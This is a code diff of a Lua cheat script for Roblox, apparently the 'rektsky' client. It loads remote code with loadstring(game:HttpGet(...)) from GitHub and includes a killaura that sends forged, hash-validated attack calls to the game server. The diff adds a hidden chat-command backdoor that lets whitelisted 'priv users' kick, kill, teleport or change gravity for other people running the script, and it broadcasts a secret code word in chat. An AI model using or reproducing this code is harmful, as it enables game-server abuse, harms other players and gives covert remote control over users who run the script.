@@ -4,7 +4,12 @@ local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rek
 
 local entity = loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/Libraries/entityHandler.lua", true))()
 
-local whitelists = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/whitelist.lua"))()
+
+local whiteliststhing = {}
+
+pcall(function()
+    whiteliststhing = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/whitelist.lua"))()
+end)
 
 do
     local oldcharacteradded = entity.characterAdded
@@ -231,31 +236,35 @@ function KillauraRemote()
             local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
             if mag <= DistVal["Value"] and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") then
                 if v.Character.Humanoid.Health > 0 then
-                    rgfejd = true
-                    local GBW = getsword()
-                    local selfPosition = lplr.Character.HumanoidRootPart.Position + (DistVal["Value"] > 14 and (lplr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude > 14 and (CFrame.lookAt(lplr.Character.HumanoidRootPart.Position, v.Character.HumanoidRootPart.Position).lookVector * 4) or Vector3.new(0, 0, 0))
-                    local Entity = v.Character
-                    local target = v.Character:GetPrimaryPartCFrame().Position
-                    attackentitycont:CallServer({
-                        ["chargedAttack"] = {["chargeRatio"] = 1},
-                        ["weapon"] = GBW ~= nil and GBW.tool,
-                        ["entityInstance"] = Entity,
-                        ["validate"] = {["targetPosition"] = {["value"] = target,
-                            ["hash"] = hvFunc(target)},
-                            ["raycast"] = {
-                                ["cameraPosition"] = hvFunc(cam.CFrame.Position), 
-                                ["cursorDirection"] = hvFunc(Ray.new(cam.CFrame.Position, v.Character:GetPrimaryPartCFrame().Position).Unit.Direction)
-                            },
-                            ["selfPosition"] = {["value"] = selfPosition,
-                                ["hash"] = hvFunc(selfPosition)
-                            }
-                        }
-                    })
-                    if killauraissoundenabled["Value"] then
-                        playsound("rbxassetid://6760544639", killaurasoundvalue["Value"])
-                    end
-                    if killauraisswingenabled["Value"] then         
-                        playanimation("rbxassetid://4947108314")
+                    for k, b in pairs(whiteliststhing) do
+                        if v.UserId ~= tonumber(b) then
+                            rgfejd = true
+                            local GBW = getsword()
+                            local selfPosition = lplr.Character.HumanoidRootPart.Position + (DistVal["Value"] > 14 and (lplr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude > 14 and (CFrame.lookAt(lplr.Character.HumanoidRootPart.Position, v.Character.HumanoidRootPart.Position).lookVector * 4) or Vector3.new(0, 0, 0))
+                            local Entity = v.Character
+                            local target = v.Character:GetPrimaryPartCFrame().Position
+                            attackentitycont:CallServer({
+                                ["chargedAttack"] = {["chargeRatio"] = 1},
+                                ["weapon"] = GBW ~= nil and GBW.tool,
+                                ["entityInstance"] = Entity,
+                                ["validate"] = {["targetPosition"] = {["value"] = target,
+                                    ["hash"] = hvFunc(target)},
+                                    ["raycast"] = {
+                                        ["cameraPosition"] = hvFunc(cam.CFrame.Position), 
+                                        ["cursorDirection"] = hvFunc(Ray.new(cam.CFrame.Position, v.Character:GetPrimaryPartCFrame().Position).Unit.Direction)
+                                    },
+                                    ["selfPosition"] = {["value"] = selfPosition,
+                                        ["hash"] = hvFunc(selfPosition)
+                                    }
+                                }
+                            })
+                            if killauraissoundenabled["Value"] then
+                                playsound("rbxassetid://6760544639", killaurasoundvalue["Value"])
+                            end
+                            if killauraisswingenabled["Value"] then         
+                                playanimation("rbxassetid://4947108314")
+                            end
+                        end
                     end
                 end
             else
@@ -2709,44 +2718,83 @@ Tabs["World"]:CreateToggle({
 })
 -- code no work lmao]]
 
-for i, v in pairs(game.Players:GetPlayers()) do
-	for k, b in pairs(whitelists) do
-		if lplr.UserId ~= tonumber(b) and v.UserId == tonumber(b) then
-            local args = {
-                [1] = "hi " .. v.Name .. "!",
+local whitelists = {
+    ["IsPrivUserInGame"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(whiteliststhing) do
+                if v.UserId == tonumber(b) then
+                    return true
+                end
+            end
+        end
+        return false
+    end,
+    ["GetPrivUser"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(whiteliststhing) do
+                if v.UserId == tonumber(b) then
+                    return v.Name
+                end
+            end
+        end
+    end
+}
+
+local alreadytold = {}
+
+repeat
+    if lplr.Name == whitelists["GetPrivUser"]() then break end
+    task.wait(1)
+    if whitelists["IsPrivUserInGame"]() then
+        if not table.find(alreadytold, whitelists["GetPrivUser"]()) then
+            table.insert(alreadytold, whitelists["GetPrivUser"]())
+            args = {
+                [1] = "/whipser " .. whitelists["GetPrivUser"](),
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            task.wait(0.5)
+            args = {
+                [1] = "RQYBPTYNURYZC",
                 [2] = "All"
             }
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
         end
-	end
-end
+    end    
+until (true == false)
 
 for i, v in pairs(game.Players:GetPlayers()) do
-    for k, b in pairs(whitelists) do
-        if lplr.UserId == tonumber(b) then
-            v.Chatted:Connect(function(msg)
-                if msg == "hi " .. lplr.Name .. "!" then
-                    print("sus")
-                    createnotification("Rektsky user detected", v.Name.. " is using rektsky", 10, true)        
-                end
-            end)
-        end 
-    end
-end
-
-for i, v in pairs(game.Players:GetPlayers()) do
-    for k, b in pairs(whitelists) do
-        if lplr.UserId ~= tonumber(b) then
-            if v.UserId == tonumber(b) then
-                v.Chatted:Connect(function(msg)
-                    if msg == "r!kick" then
-                        lplr:kick("Skill issue'd by rektsky priv user!")
+    if lplr.Name == whitelists["GetPrivUser"]() then 
+        v.Chatted:connect(function(msg)
+            if msg == "RQYBPTYNURYZC" then
+                createnotification("RektSky", v.Name .. " is using rektsky!", 60, true)
+            end
+        end)
+    else
+        for lol, xd in pairs(whiteliststhing) do
+            if v.UserId == tonumber(xd) then
+                v.Chatted:connect(function(msg)
+                    if msg:find("r!kick") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub("r!kick " .. lplr.Name, "")
+                            lplr:kick(args)
+                        end
                     end
-                    if msg == "r!lagback" then
-                        lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(555, 0, 0)
+                    if msg:find("r!kill") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                        end
                     end
-                    if msg == "r!kill" then
-                        lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                    if msg:find("r!lagback") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000, 0)
+                        end
+                    end
+                    if msg:find("r!gravity") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub("r!gravity " .. lplr.Name, "")
+                            game.Workspace.Gravity = tonumber(args)
+                        end
                     end
                 end)
             end
